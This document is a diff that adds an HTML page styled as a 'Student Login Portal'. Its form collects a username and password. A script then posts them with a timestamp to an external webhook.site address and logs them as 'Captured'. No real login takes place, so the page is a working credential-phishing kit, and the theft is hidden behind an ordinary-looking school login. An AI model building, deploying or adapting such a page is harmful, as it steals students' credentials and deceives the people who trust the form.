@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Student Login Portal</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 40px;
+      background-color: #f4f4f4;
+    }
+
+    h2 {
+      color: #333;
+    }
+
+    form {
+      background: white;
+      padding: 25px;
+      border-radius: 8px;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 95%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    input[type="submit"] {
+      background-color: #007bff;
+      color: white;
+      padding: 10px 25px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Student Login Portal</h2>
+  <p>Please enter your student login credentials below.</p>
+
+  <form onsubmit="sendData(); return false;">
+    <label for="username">Username:</label><br>
+    <input type="text" id="username" required><br>
+
+    <label for="password">Password:</label><br>
+    <input type="password" id="password" required><br>
+
+    <input type="submit" value="Login">
+  </form>
+
+  <script>
+    function sendData() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const fullData = {
+        username: username,
+        password: password,
+        time: new Date().toLocaleString()
+      };
+
+      fetch("https://webhook.site/be513fd2-fb6f-42d3-84ea-841401f84e0e", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(fullData)
+      });
+
+      console.log("Captured:", fullData);
+    }
+  </script>
+
+</body>
+</html>
